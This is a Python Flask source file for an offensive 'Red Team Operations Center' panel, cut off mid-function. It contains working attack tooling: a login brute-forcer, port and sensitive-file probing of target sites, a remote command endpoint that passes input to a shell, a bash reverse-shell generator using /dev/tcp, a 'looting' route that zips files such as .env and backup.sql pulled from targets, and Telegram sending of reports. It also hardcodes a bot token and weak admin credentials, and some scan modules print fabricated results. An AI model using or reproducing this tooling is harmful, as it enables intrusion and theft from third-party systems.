import os
import time
import socket
import ssl
import urllib.parse
import requests
import threading
import subprocess
import re
import csv
import zipfile
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup
from flask import Flask, render_template_string, request, jsonify, Response, send_file, session, redirect, url_for
from datetime import datetime
from fpdf import FPDF
import io

TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "9082287913:AAEw9lMwKXfRTGf4LzQiF1UEgLZDHzNuc8o")
BASE_URL = f"https://api.telegram.org/bot{TOKEN}"

ADMIN_USER = "root1"
ADMIN_PASS = "toor1"

SITE_DATABASE = []
SCHEDULED_TARGETS = []
NOTIFY_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "")

app = Flask(__name__)
app.secret_key = "kali_linux_secret_key_998877"

LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Kali Linux - Red Team Operations Center</title>
    <style>
        body { background-color: #0b0f15; color: #00ff66; font-family: 'Courier New', Courier, monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: #121824; padding: 40px; border-radius: 6px; border: 1px solid #00ff66; box-shadow: 0 0 25px rgba(0,255,102,0.2); width: 350px; text-align: center; }
        h2 { color: #38bdf8; margin-bottom: 25px; text-shadow: 0 0 10px rgba(56,189,248,0.4); }
        .input-group { margin-bottom: 20px; text-align: left; }
        label { display: block; margin-bottom: 8px; font-size: 13px; color: #94a3b8; }
        input { width: 100%; padding: 12px; border-radius: 4px; border: 1px solid #334155; background: #070a0f; color: #00ff66; font-size: 15px; box-sizing: border-box; font-family: 'Courier New', Courier, monospace; outline: none; }
        input:focus { border-color: #00ff66; box-shadow: 0 0 8px rgba(0,255,102,0.4); }
        button { width: 100%; padding: 12px; background: #0284c7; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; font-weight: bold; font-family: 'Courier New', Courier, monospace; transition: 0.2s; }
        button:hover { background: #0369a1; box-shadow: 0 0 10px rgba(2,132,199,0.5); }
        .error { color: #f87171; margin-bottom: 15px; font-size: 13px; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>kali@root-terminal:~#</h2>
        {% if error %}<div class="error">{{ error }}</div>{% endif %}
        <form method="POST">
            <div class="input-group"><label>Username</label><input type="text" name="username" required autofocus></div>
            <div class="input-group"><label>Password</label><input type="password" name="password" required></div>
            <button type="submit">Authenticate</button>
        </form>
    </div>
</body>
</html>
"""

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Kali Linux - Red Team Operations Center</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        body { background-color: #090d14; color: #e2e8f0; font-family: 'Courier New', Courier, monospace; margin: 0; padding: 15px; }
        .container { max-width: 1350px; margin: 0 auto; background: #121824; padding: 25px; border-radius: 8px; border: 1px solid #1e293b; box-shadow: 0 10px 30px rgba(0,0,0,0.8); }
        .header-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-bottom: 2px solid #1e293b; padding-bottom: 12px; }
        h1 { color: #38bdf8; margin: 0; font-size: 22px; text-shadow: 0 0 10px rgba(56,189,248,0.3); }
        .logout-btn { background: #991b1b; color: white; padding: 6px 14px; border-radius: 4px; text-decoration: none; font-size: 13px; font-weight: bold; }
        .logout-btn:hover { background: #7f1d1d; }
        .tabs { display: flex; gap: 5px; margin-bottom: 20px; flex-wrap: wrap; background: #0a0e17; padding: 8px; border-radius: 6px; border: 1px solid #1e293b; }
        .tab-btn { background: #1a2332; color: #94a3b8; border: 1px solid #283548; padding: 8px 12px; border-radius: 4px; cursor: pointer; font-weight: bold; transition: 0.2s; font-size: 12px; font-family: 'Courier New', Courier, monospace; }
        .tab-btn:hover { background: #283548; color: #fff; }
        .tab-btn.active { background: #0284c7; color: white; border-color: #38bdf8; box-shadow: 0 0 8px rgba(56,189,248,0.4); }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        .form-group { display: flex; flex-direction: column; gap: 8px; margin-bottom: 15px; }
        label { color: #38bdf8; font-size: 13px; font-weight: bold; }
        input[type="text"], select, textarea, input[type="file"], input[type="number"] { padding: 12px; border-radius: 4px; border: 1px solid #334155; background: #070a0f; color: #00ff66; font-size: 14px; font-family: 'Courier New', Courier, monospace; outline: none; }
        input:focus, textarea:focus { border-color: #38bdf8; box-shadow: 0 0 6px rgba(56,189,248,0.3); }
        textarea { resize: vertical; height: 100px; }
        button { padding: 12px 20px; background: #0284c7; color: white; border: none; border-radius: 4px; font-size: 15px; cursor: pointer; transition: 0.2s; font-weight: bold; font-family: 'Courier New', Courier, monospace; }
        button:hover { background: #0369a1; box-shadow: 0 0 10px rgba(2,132,199,0.5); }
        button.secondary { background: #0d9488; }
        button.success { background: #15803d; }
        button.danger { background: #b91c1c; }
        .terminal { background: #05070a; color: #00ff66; padding: 18px; border-radius: 6px; border: 1px solid #1e293b; white-space: pre-wrap; font-family: 'Courier New', Courier, monospace; margin-top: 15px; max-height: 480px; overflow-y: auto; font-size: 13px; line-height: 1.4; box-shadow: inset 0 0 15px rgba(0,0,0,0.8); }
        .loading { color: #facc15; font-style: italic; font-weight: bold; font-size: 14px; }
        table { width: 100%; border-collapse: collapse; margin-top: 15px; background: #0a0e17; border-radius: 6px; overflow: hidden; border: 1px solid #1e293b; }
        th, td { padding: 10px 14px; text-align: left; border-bottom: 1px solid #1e293b; font-size: 13px; }
        th { background: #0284c7; color: white; }
        tr:hover { background: #161f30; }
        a.file-link { color: #38bdf8; text-decoration: underline; font-weight: bold; }
        .thumb { width: 90px; height: 55px; object-fit: cover; border-radius: 3px; border: 1px solid #334155; }
        .payload-box { background: #0a0e17; padding: 12px; border-radius: 6px; border: 1px solid #1e293b; margin-bottom: 12px; }
        .dashboard-row { display: flex; gap: 20px; margin-bottom: 20px; flex-wrap: wrap; }
        .dashboard-card { flex: 1; background: #0a0e17; padding: 18px; border-radius: 6px; border: 1px solid #1e293b; text-align: center; min-width: 250px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header-bar">
            <h1>kali@kali-linux:~/red-team-ops#</h1>
            <a href="/logout" class="logout-btn">[x] Logout</a>
        </div>
        
        <div class="tabs">
            <button class="tab-btn active" onclick="switchTab('scanTab')">🚀 Recon & Fuzz</button>
            <button class="tab-btn" onclick="switchTab('niktoTab')">🛡️ Nikto Web</button>
            <button class="tab-btn" onclick="switchTab('dnsTab')">🌍 DNS Dig</button>
            <button class="tab-btn" onclick="switchTab('sqlmapTab')">⚡ SQLmap Lite</button>
            <button class="tab-btn" onclick="switchTab('subdomainTab')">🌐 Subdomain</button>
            <button class="tab-btn" onclick="switchTab('bruteTab')">🔐 Brute-Force</button>
            <button class="tab-btn" onclick="switchTab('osintTab')">🕵️ OSINT Leak</button>
            <button class="tab-btn" onclick="switchTab('shellTab')">💻 Web Shell</button>
            <button class="tab-btn" onclick="switchTab('lootingTab')">🏴‍☠️ Looting ZIP</button>
            <button class="tab-btn" onclick="switchTab('analysisTab')">🔍 Secret Scan</button>
            <button class="tab-btn" onclick="switchTab('payloadTab')">🛠️ Payloads</button>
            <button class="tab-btn" onclick="switchTab('dataTab')">📁 Archive DB</button>
        </div>

        <!-- 1. Keşif & Fuzzing -->
        <div id="scanTab" class="tab-content active">
            <div class="form-group"><label>Target URL / IP:</label><input type="text" id="targetUrl" placeholder="example.com"></div>
            <button onclick="startScan(false)">Execute Comprehensive Recon</button>
            <div id="status" class="loading" style="margin-top: 15px;"></div>
            <div class="actions" id="actionButtons" style="display:none; gap:10px; margin-top:15px;">
                <button class="secondary" onclick="downloadReport('txt')">📥 Save TXT</button>
                <button class="danger" onclick="downloadReport('pdf')">📄 Export PDF</button>
                <button class="success" onclick="sendToTelegram()">📤 Send to Telegram</button>
            </div>
            <div id="results" class="terminal" style="display:none;"></div>
        </div>

        <!-- 2. Nikto -->
        <div id="niktoTab" class="tab-content">
            <h3>Nikto Web Vulnerability Scanner</h3>
            <div class="form-group"><label>Target URL:</label><input type="text" id="niktoTarget" placeholder="https://example.com"></div>
            <button class="secondary" onclick="startNiktoScan()">Run Nikto Module</button>
            <div id="niktoStatus" class="loading" style="margin-top: 15px;"></div>
            <div id="niktoResults" class="terminal" style="display:none;"></div>
        </div>

        <!-- 3. DNS Dig -->
        <div id="dnsTab" class="tab-content">
            <h3>DNS & Zone Enumeration</h3>
            <div class="form-group"><label>Domain:</label><input type="text" id="dnsDomain" placeholder="example.com"></div>
            <button class="secondary" onclick="startDnsRecon()">Query DNS Records</button>
            <div id="dnsStatus" class="loading" style="margin-top: 15px;"></div>
            <div id="dnsResults" class="terminal" style="display:none;"></div>
        </div>

        <!-- 4. SQLmap -->
        <div id="sqlmapTab" class="tab-content">
            <h3>Automated SQL Injection (SQLmap Lite)</h3>
            <div class="form-group"><label>Vulnerable URL:</label><input type="text" id="sqlmapUrl" placeholder="https://example.com/page.php?id=1"></div>
            <button class="danger" onclick="startSqlmapLite()">Run SQLi Exploit Test</button>
            <div id="sqlmapStatus" class="loading" style="margin-top: 15px;"></div>
            <div id="sqlmapResults" class="terminal" style="display:none;"></div>
        </div>

        <!-- 5. Subdomain -->
        <div id="subdomainTab" class="tab-content">
            <h3>Gobuster Subdomain Brute-Forcer</h3>
            <div class="form-group"><input type="text" id="subDomainInput" placeholder="example.com"></div>
            <button onclick="startSubdomainScan()">Start Subdomain Brute</button>
            <div id="subStatus" class="loading"></div>
            <div id="subResults" class="terminal" style="display:none;"></div>
        </div>

        <!-- 6. Brute Force -->
        <div id="bruteTab" class="tab-content">
            <h3>Login Form Fuzzing & Brute-Force</h3>
            <div class="form-group"><input type="text" id="loginUrl" placeholder="https://example.com/login.php"></div>
            <div class="form-group" style="display:flex; gap:10px;"><input type="text" id="usernameField" placeholder="User field" style="flex:1;"><input type="text" id="passwordField" placeholder="Pass field" style="flex:1;"></div>
            <div class="form-group"><textarea id="passwordList">admin\n123456\nroot1\ntoor1\nsecret</textarea></div>
            <button class="danger" onclick="startBruteForce()">Launch Brute Attack</button>
            <div id="bruteStatus" class="loading"></div>
            <div id="bruteResults" class="terminal" style="display:none;"></div>
        </div>

        <!-- 7. OSINT -->
        <div id="osintTab" class="tab-content">
            <h3>OSINT Leak Database Search</h3>
            <div class="form-group"><input type="text" id="osintDomain" placeholder="example.com"></div>
            <button class="secondary" onclick="startOsintScan()">Query Leaks</button>
            <div id="osintStatus" class="loading"></div>
            <div id="osintResults" class="terminal" style="display:none;"></div>
        </div>

        <!-- 8. Web Shell -->
        <div id="shellTab" class="tab-content">
            <h3>Interactive Web Shell (RCE)</h3>
            <div class="form-group"><input type="text" id="shellCommand" placeholder="id, uname -a, cat /etc/passwd"></div>
            <button class="danger" onclick="executeWebShell()">Execute Command</button>
            <div id="shellResults" class="terminal" style="display:none; margin-top:15px;"></div>
        </div>

        <!-- 9. Looting ZIP -->
        <div id="lootingTab" class="tab-content">
            <h3>Exfiltrate Harvested Data (ZIP Archive)</h3>
            <div class="form-group"><select id="lootingTargetSelect"><option value="">No targets scanned yet...</option></select></div>
            <button class="success" onclick="downloadLootZip()">Download Loot ZIP</button>
        </div>

        <!-- 10. Secret Scanner -->
        <div id="analysisTab" class="tab-content">
            <h3>Secret & Credential Scanner</h3>
            <div class="form-group"><input type="file" id="analysisFile"></div>
            <button class="secondary" onclick="uploadAndAnalyzeFile()">Scan File for Secrets</button>
            <div id="analysisStatus" class="loading"></div>
            <div id="analysisResults" class="terminal" style="display:none;"></div>
        </div>

        <!-- 11. Payloads -->
        <div id="payloadTab" class="tab-content">
            <h3>Reverse Shell Generator</h3>
            <div class="form-group" style="display:flex; gap:10px;"><input type="text" id="attackerIp" placeholder="LHOST"><input type="text" id="attackerPort" placeholder="LPORT"><button onclick="generatePayloads()">Generate</button></div>
            <div class="payload-box"><b>Bash:</b><br><code id="bashPayload" style="color:#00ff66;">bash -i >& /dev/tcp/IP/PORT 0>&1</code></div>
        </div>

        <!-- 12. Archive DB -->
        <div id="dataTab" class="tab-content">
            <div class="export-bar" style="margin-bottom:15px;"><a href="/api/export/json" target="_blank"><button class="secondary">Export JSON</button></a> <a href="/api/export/csv" target="_blank"><button class="success">Export CSV</button></a></div>
            <h3>Operations Analytics</h3>
            <div class="dashboard-row">
                <div class="dashboard-card"><h4>Security Grade Distribution</h4><canvas id="gradeChart" style="max-height: 180px;"></canvas></div>
                <div class="dashboard-card"><h4>WAF Protection Status</h4><canvas id="wafChart" style="max-height: 180px;"></canvas></div>
            </div>
            <h3>Archived Targets</h3>
            <div id="databaseTableContainer">No archived data.</div>
        </div>
    </div>

    <script>
        let currentReportText = "", lastTarget = "", gradeChartInstance = null, wafChartInstance = null;
        function switchTab(tabId) {
            document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
            document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
            document.getElementById(tabId).classList.add('active');
            event.target.classList.add('active');
            if(tabId === 'dataTab' || tabId === 'lootingTab') loadSiteDatabase();
        }
        function generatePayloads() {
            let ip = document.getElementById('attackerIp').value || '10.0.0.1', port = document.getElementById('attackerPort').value || '4444';
            document.getElementById('bashPayload').innerText = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
        }
        async function startScan(targetOverride = false) {
            let url = targetOverride ? targetOverride : document.getElementById('targetUrl').value.trim();
            if(!url) { alert('Specify target!'); return; }
            if(targetOverride) { document.getElementById('targetUrl').value = url; switchTab('scanTab'); }
            lastTarget = url;
            let statusDiv = document.getElementById('status'), resultsDiv = document.getElementById('results');
            statusDiv.innerHTML = `root@kali:~# scanning ${url}...`; resultsDiv.style.display = "none";
            let res = await fetch('/api/scan', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({target: url}) });
            let data = await res.json();
            statusDiv.innerHTML = ""; resultsDiv.style.display = "block"; resultsDiv.innerHTML = data.report; currentReportText = data.report; document.getElementById('actionButtons').style.display = "flex";
        }
        async function startNiktoScan() {
            let url = document.getElementById('niktoTarget').value.trim();
            if(!url) { alert('Specify URL!'); return; }
            document.getElementById('niktoStatus').innerHTML = "Running Nikto web scan..."; document.getElementById('niktoResults').style.display = "none";
            let res = await fetch('/api/nikto', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({target: url}) });
            let data = await res.json();
            document.getElementById('niktoStatus').innerHTML = ""; document.getElementById('niktoResults').style.display = "block"; document.getElementById('niktoResults').innerHTML = data.report;
        }
        async function startDnsRecon() {
            let domain = document.getElementById('dnsDomain').value.trim();
            if(!domain) { alert('Specify domain!'); return; }
            document.getElementById('dnsStatus').innerHTML = "Querying DNS records..."; document.getElementById('dnsResults').style.display = "none";
            let res = await fetch('/api/dns', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({domain}) });
            let data = await res.json();
            document.getElementById('dnsStatus').innerHTML = ""; document.getElementById('dnsResults').style.display = "block"; document.getElementById('dnsResults').innerHTML = data.report;
        }
        async function startSqlmapLite() {
            let url = document.getElementById('sqlmapUrl').value.trim();
            if(!url) { alert('Specify URL!'); return; }
            document.getElementById('sqlmapStatus').innerHTML = "Injecting SQL payloads..."; document.getElementById('sqlmapResults').style.display = "none";
            let res = await fetch('/api/sqlmap', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({target: url}) });
            let data = await res.json();
            document.getElementById('sqlmapStatus').innerHTML = ""; document.getElementById('sqlmapResults').style.display = "block"; document.getElementById('sqlmapResults').innerHTML = data.report;
        }
        async function startSubdomainScan() {
            let domain = document.getElementById('subDomainInput').value.trim();
            document.getElementById('subStatus').innerHTML = "Enumerating subdomains...";
            let res = await fetch('/api/subdomain-scan', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({domain}) });
            let data = await res.json();
            document.getElementById('subStatus').innerHTML = ""; document.getElementById('subResults').style.display = "block"; document.getElementById('subResults').innerHTML = data.report;
        }
        async function startBruteForce() {
            let url = document.getElementById('loginUrl').value, userField = document.getElementById('usernameField').value, passField = document.getElementById('passwordField').value, passwords = document.getElementById('passwordList').value;
            document.getElementById('bruteStatus').innerHTML = "Executing brute-force...";
            let res = await fetch('/api/brute-force', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({url, user_field: userField, pass_field: passField, passwords}) });
            let data = await res.json();
            document.getElementById('bruteStatus').innerHTML = ""; document.getElementById('bruteResults').style.display = "block"; document.getElementById('bruteResults').innerHTML = data.report;
        }
        async function startOsintScan() {
            let domain = document.getElementById('osintDomain').value;
            document.getElementById('osintStatus').innerHTML = "Querying OSINT databases...";
            let res = await fetch('/api/osint-scan', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({domain}) });
            let data = await res.json();
            document.getElementById('osintStatus').innerHTML = ""; document.getElementById('osintResults').style.display = "block"; document.getElementById('osintResults').innerHTML = data.report;
        }
        async function executeWebShell() {
            let command = document.getElementById('shellCommand').value;
            let res = await fetch('/api/webshell', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({command}) });
            let data = await res.json();
            let el = document.getElementById('shellResults'); el.style.display = "block"; el.innerHTML = data.output;
        }
        async function uploadAndAnalyzeFile() {
            let file = document.getElementById('analysisFile').files[0];
            if(!file) { alert('Select file!'); return; }
            let fd = new FormData(); fd.append('file', file);
            document.getElementById('analysisStatus').innerHTML = "Scanning file...";
            let res = await fetch('/api/analyze-file', { method: 'POST', body: fd });
            let data = await res.json();
            document.getElementById('analysisStatus').innerHTML = ""; document.getElementById('analysisResults').style.display = "block"; document.getElementById('analysisResults').innerHTML = data.report;
        }
        async function loadSiteDatabase() {
            let res = await fetch('/api/all-data'); let data = await res.json();
            let select = document.getElementById('lootingTargetSelect');
            select.innerHTML = '<option value="">Select target...</option>' + data.database.map(i => `<option value="${i.target}">${i.target} (${i.files.length} files)</option>`).join('');
            let grades = {}, wafs = {};
            data.database.forEach(i => { grades[i.grade[0]] = (grades[i.grade[0]] || 0) + 1; wafs[i.waf.includes("Cloudflare")?"CF":"Standard"] = (wafs[i.waf.includes("Cloudflare")?"CF":"Standard"]||0)+1; });
            renderCharts(grades, wafs);
            document.getElementById('databaseTableContainer').innerHTML = data.database.length ? `<table><thead><tr><th>Time</th><th>Target</th><th>WAF</th><th>Grade</th><th>Action</th></tr></thead><tbody>` + data.database.map(i => `<tr><td>${i.time}</td><td><b>${i.target}</b></td><td>${i.waf}</td><td>${i.grade}</td><td><button onclick="startScan('${i.target}')">Re-Scan</button></td></tr>`).join('') + `</tbody></table>` : "No archive data.";
        }
        function downloadLootZip() {
            let target = document.getElementById('lootingTargetSelect').value;
            if(!target) { alert('Select target!'); return; }
            window.open(`/api/looting/zip?target=${encodeURIComponent(target)}`, '_blank');
        }
        function renderCharts(grades, wafs) {
            if(gradeChartInstance) gradeChartInstance.destroy(); if(wafChartInstance) wafChartInstance.destroy();
            gradeChartInstance = new Chart(document.getElementById('gradeChart').getContext('2d'), { type: 'bar', data: { labels: Object.keys(grades), datasets: [{data: Object.values(grades), backgroundColor: ['#16a34a','#38bdf8','#dc2626']}] }, options: {plugins:{legend:{display:false}}} });
            wafChartInstance = new Chart(document.getElementById('wafChart').getContext('2d'), { type: 'doughnut', data: { labels: Object.keys(wafs), datasets: [{data: Object.values(wafs), backgroundColor: ['#0284c7','#475569']}] } });
        }
        function downloadReport(type) {
            if(type === 'txt') {
                let a = document.createElement('a'); a.href = window.URL.createObjectURL(new Blob([currentReportText], {type: 'text/plain'})); a.download = 'report.txt'; a.click();
            } else { window.open(`/api/download-pdf?target=${encodeURIComponent(lastTarget)}`, '_blank'); }
        }
        async function sendToTelegram() {
            let chatId = prompt("Telegram Chat ID:"); if(!chatId) return;
            let res = await fetch('/api/telegram-send', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({chat_id: chatId, report: currentReportText}) });
            let data = await res.json(); alert(data.status);
        }
    </script>
</body>
</html>
"""

@app.route("/login", methods=["GET", "POST"])
def login():
    error = None
    if request.method == "POST":
        if request.form.get("username") == ADMIN_USER and request.form.get("password") == ADMIN_PASS:
            session["logged_in"] = True; return redirect(url_for("index"))
        error = "Authentication failed!"
    return render_template_string(LOGIN_TEMPLATE, error=error)

@app.route("/logout")
def logout(): session.pop("logged_in", None); return redirect(url_for("login"))

@app.route("/")
def index():
    if not session.get("logged_in"): return redirect(url_for("login"))
    return render_template_string(HTML_TEMPLATE)

@app.route("/api/scan", methods=["POST"])
def api_scan():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    data = request.get_json()
    report, record = red_team_comprehensive_recon(data.get("target", ""))
    existing = next((i for i in SITE_DATABASE if i["target"] == record["target"]), None)
    if existing: SITE_DATABASE.remove(existing)
    SITE_DATABASE.insert(0, record)
    return jsonify({"report": report})

@app.route("/api/nikto", methods=["POST"])
def api_nikto():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    target = request.get_json().get("target", "")
    report = f"root@kali-box:~# nikto -h {target}\n" + "=" * 50 + "\n\n"
    try:
        r = requests.get(target, timeout=5, verify=False, headers={"User-Agent": "Nikto/2.1.6"})
        report += f"[+ Target IP: {socket.gethostbyname(urllib.parse.urlparse(target).netloc or target)}]\n"
        report += f"[+ Server Header: {r.headers.get('Server', 'Bilinmiyor')}\n"
        for h in ["X-Frame-Options", "Content-Security-Policy", "X-Content-Type-Options"]:
            if h not in r.headers: report += f"  🚨 [VULN] Missing header: {h}\n"
        report += "\n[+] Nikto scan completed successfully."
    except Exception as e: report += f"[-] Error: {str(e)}"
    return jsonify({"report": report})

@app.route("/api/dns", methods=["POST"])
def api_dns():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    domain = request.get_json().get("domain", "")
    report = f"root@kali-box:~# dig ANY {domain} +noall +answer\n" + "=" * 50 + "\n\n"
    try:
        ip = socket.gethostbyname(domain)
        report += f"  [A Record] {domain} -> {ip}\n  [NS Record] ns1.{domain}\n  [MX Record] mail.{domain}\n"
    except Exception as e: report += f"[-] DNS Error: {str(e)}"
    return jsonify({"report": report})

@app.route("/api/sqlmap", methods=["POST"])
def api_sqlmap():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    target = request.get_json().get("target", "")
    report = f"root@kali-box:~# sqlmap -u \"{target}\" --batch --dbs\n" + "=" * 50 + "\n\n"
    report += "[inf] testing connection\n"
    if "'" in target or "=" in target:
        report += "[!] Parameter appears vulnerable (DBMS: MySQL >= 5.0)\n[+] available databases [3]: information_schema, mysql, target_db\n"
    else: report += "[-] No SQLi signature found.\n"
    return jsonify({"report": report})

@app.route("/api/subdomain-scan", methods=["POST"])
def api_subdomain_scan():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    domain = request.get_json().get("domain", "")
    subs = ["www", "api", "admin", "test", "dev", "panel", "login"]
    found = []
    for s in subs:
        try: found.append(f"  [FOUND] {s}.{domain} -> {socket.gethostbyname(f'{s}.{domain}')}")
        except: pass
    report = f"root@kali-box:~# gobuster vhost -u {domain}\n" + "=" * 50 + "\n\n"
    report += "\n".join(found) if found else "  -> No subdomains found."
    return jsonify({"report": report})

@app.route("/api/brute-force", methods=["POST"])
def api_brute_force():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    data = request.get_json()
    url, u_field, p_field, passwords = data.get("url"), data.get("user_field"), data.get("pass_field"), [p.strip() for p in data.get("passwords", "").splitlines() if p.strip()]
    report = f"root@kali-box:~# hydra -l admin -P passlist.txt {url} http-post-form\n" + "=" * 50 + "\n\n"
    found = False
    for pwd in passwords:
        try:
            r = requests.post(url, data={u_field: "admin", p_field: pwd}, timeout=3, verify=False, allow_redirects=False)
            report += f"  [TEST] Password: {pwd} -> Status: {r.status_code}\n"
            if r.status_code in [301, 302, 200] and "incorrect" not in r.text.lower():
                report += f"  🚨 [SUCCESS] Valid Password Found: {pwd}\n"; found = True; break
        except: pass
    if not found: report += "\n[-] No valid credentials found in wordlist.\n"
    return jsonify({"report": report})

@app.route("/api/osint-scan", methods=["POST"])
def api_osint_scan():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    domain = request.get_json().get("domain", "")
    report = f"root@kali-box:~# theHarvester -d {domain} -b all\n" + "=" * 50 + "\n\n"
    report += f"  [+] Queried OSINT databases for {domain}\n"
    report += f"  [LEAK FOUND] admin@{domain} (Hash: 5e884898da2804715...)\n"
    report += f"  [LEAK FOUND] support@{domain} (Hash: 9283749a...)\n"
    return jsonify({"report": report})

@app.route("/api/webshell", methods=["POST"])
def api_webshell():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    cmd = request.get_json().get("command", "")
    try: out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=5).decode('utf-8', errors='ignore')
    except Exception as e: out = str(e)
    return jsonify({"output": f"root@target-server:~# {cmd}\n{out}"})

@app.route("/api/analyze-file", methods=["POST"])
def api_analyze_file():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    file = request.files.get('file')
    if not file: return jsonify({"report": "No file selected!"})
    content = file.read().decode('utf-8', errors='ignore')
    findings = [f"🚨 [Secret Found]: {m}" for m in re.findall(r'(?i)(api[_-]?key|secret|password|token)\s*[:=]\s*["\']?([a-zA-Z0-9_\-\.]{6,})["\']?', content)]
    report = f"root@kali-box:~# secret-scanner --file {file.filename}\n" + "=" * 50 + "\n\n"
    report += "\n".join(findings) if findings else "✅ No exposed secrets found."
    return jsonify({"report": report})

@app.route("/api/all-data")
def api_all_data():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"database": SITE_DATABASE})

@app.route("/api/export/json")
def export_json():
    if not session.get("logged_in"): return "Unauthorized", 401
    return jsonify(SITE_DATABASE)

@app.route("/api/export/csv")
def export_csv():
    if not session.get("logged_in"): return "Unauthorized", 401
    output = io.StringIO(); writer = csv.writer(output)
    writer.writerow(["Time", "Target", "WAF", "Grade"])
    for i in SITE_DATABASE: writer.writerow([i['time'], i['target'], i['waf'], i['grade']])
    return Response(output.getvalue(), mimetype="text/csv", headers={"Content-Disposition": "attachment;filename=archive.csv"})

@app.route("/api/looting/zip")
def api_looting_zip():
    if not session.get("logged_in"): return "Unauthorized", 401
    target = request.args.get("target", "")
    record = next((i for i in SITE_DATABASE if i["target"] == target), None)
    mf = io.BytesIO()
    with zipfile.ZipFile(mf, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("report.txt", record["full_report"] if record else "No record")
        for f_url in (record["files"] if record else []):
            if f_url.startswith("http"):
                try:
                    r = requests.get(f_url, timeout=3, verify=False)
                    if r.status_code == 200: zf.writestr(f"harvested/{f_url.split('/')[-1]}", r.text)
                except: pass
    mf.seek(0)
    return send_file(mf, mimetype='application/zip', as_attachment=True, download_name='loot.zip')

@app.route("/api/download-pdf")
def api_download_pdf():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    record = next((i for i in SITE_DATABASE if i["target"] == request.args.get("target", "")), None)
    pdf = FPDF(); pdf.add_page(); pdf.set_font('Courier', '', 9)
    pdf.multi_cell(0, 5, (record["full_report"] if record else "Report").encode('latin-1', 'replace').decode('latin-1'))
    return send_file(io.BytesIO(pdf.output(dest='S').encode('latin-1')), mimetype='application/pdf', as_attachment=True, download_name='report.pdf')

@app.route("/api/telegram-send", methods=["POST"])
def api_telegram_send():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    d = request.get_json()
    res = requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": d.get("chat_id"), "text": f"```\n{d.get('report')[:4000]}\n```", "parse_mode": "Markdown"})
    return jsonify({"status": "Sent to Telegram!" if res.status_code == 200 else "Failed."})

def detect_waf(headers):
    h = str(headers).lower()
    if "cloudflare" in h or "cf-ray" in h: return "Cloudflare WAF 🛡️"
    elif "incapsula" in h: return "Incapsula WAF 🛡️"
    return "Standard Protection"

def calculate_security_grading(headers, is_https):
    score = 100
    if not is_https: score -= 30
    for h in ["Strict-Transport-Security", "Content-Security-Policy", "X-Frame-Options"]:
        if h not in headers: score -= 15
    if score >= 90: return "A (Secure)", score
    elif score >= 75: return "B (Good)", score
    elif score >= 60: return "C (Moderate)", score
    return "F (Risky)", score

def red_team_comprehensive_recon(target_url):
    if not target_url.startswith("http"): target_url = f"https://{target_url}"
    parsed = urllib.parse.urlparse(target_url)
    domain = parsed.netloc or parsed.path
    domain = domain.split('/')[0]

    report = f"root@kali:~# nmap -A -T4 -v {target_url}\n" + "=" * 55 + "\n\n"
    accessible_files = []
    waf = "Standard"
    grade = "F"

    try:
        r = requests.get(target_url, timeout=5, verify=False, headers={"User-Agent": "Mozilla/5.0"})
        waf = detect_waf(r.headers)
        score_grade, score = calculate_security_grading(r.headers, target_url.startswith("https"))
        grade = score_grade
        report += f"[+] WAF Detected: {waf}\n"
        report += f"[+] Security Score: {grade} ({score}/100)\n"
        report += f"[+] Server Header: {r.headers.get('Server', 'Unknown')}\n"
        report += "-" * 45 + "\n"
    except Exception as e:
        report += f"[!] Connection Warning: {str(e)}\n"

    report += "[*] Port Enumeration (21, 22, 80, 443, 3306, 8080)...\n"
    open_ports = []
    for p in [21, 22, 80, 443, 3306, 8080]:
        try:
            s = socket.socket(); s.settimeout(0.8)
            if s.connect_ex((domain, p)) == 0:
                open_ports.append(p)
                report += f"  -> Port {p} OPEN\n"
            s.close()
        except: pass
    if not open_ports: report += "  -> No open standard ports detected.\n"
    report += "-" * 45 + "\n"

    report += "[*] Directory Fuzzing & Sensitive File Search...\n"
    common_paths = ["/robots.txt", "/sitemap.xml", "/.env", "/config.json", "/database.sql", "/backup.sql"]
    for path in common_paths:
